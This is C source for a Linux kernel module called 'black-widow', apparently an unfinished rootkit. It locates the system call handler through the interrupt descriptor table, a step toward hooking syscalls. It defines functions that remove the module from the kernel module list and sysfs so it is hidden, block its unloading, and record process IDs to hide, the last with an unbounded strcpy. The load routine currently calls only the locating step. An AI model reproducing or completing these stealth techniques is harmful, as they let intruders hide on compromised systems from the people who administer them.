/*
 * =====================================================================================
 *
 *       Filename:  black-widow.c
 *
 *    Description:  main src file
 *
 *        Version:  1.0
 *        Created:  03/27/2015 01:43:28 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  samy shehata
 *   Organization:  
 *
 * =====================================================================================
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/seq_file.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/syscalls.h>

static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
static char pid_list[10][32];
static int last_proc = -1;

static void hexdump(unsigned char* ptr, unsigned int length) {
  unsigned int i;
  for (i = 0; i < length; i++) {
    if (!((i+1) % 16)) {
      printk("%02x\n", *(ptr+i));
    } else {
      if (!((i+1)%4)) {
        printk("%02x  ", *(ptr+i));
      } else {
        printk("%02x ", *(ptr+i));
      }
    }
  }
}

static void find_sctable(void) {
  struct desc_ptr idtr;
  gate_desc *idt_table;
  gate_desc *system_call_gate;
  unsigned long _system_call_off;
  unsigned char *_system_call_ptr;

  unsigned int i;
  unsigned char off;

  asm ("sidt %0" : "=m" (idtr));
  printk("+ IDT is at %08x\n", idtr.address);
  idt_table = (gate_desc*) idtr.address;
  system_call_gate = &idt_table[0x80];

  _system_call_off = gate_offset(*system_call_gate);
  _system_call_ptr = (unsigned char *) _system_call_off;
  printk("+ system_call is at %08x\n", _system_call_off);
  printk("+ system_call is at %08x\n", _system_call_ptr);
  hexdump(_system_call_ptr, 128);

}

static inline void memorize(void) {
  prev_entry = THIS_MODULE->list.prev;
  find_sctable();
}

static inline void vanish(void) {
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del(&THIS_MODULE->mkobj.kobj.entry);

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;
}

static inline void appear(void) {
  list_add(&THIS_MODULE->list, prev_entry);
}

static inline void protect(void) {
  try_module_get(THIS_MODULE);
}

static inline void release(void) {
  module_put(THIS_MODULE);
}

static inline void hide_proc(char* pid) {
  if (last_proc == 9)
    return;
  strcpy(pid_list[++last_proc], pid);
}

// on module load
static int __init load_module(void) {
  memorize(); 
  return 0;
}

// on module unload
static void __exit cleanup(void) {
  return;
}

module_init(load_module);
module_exit(cleanup);
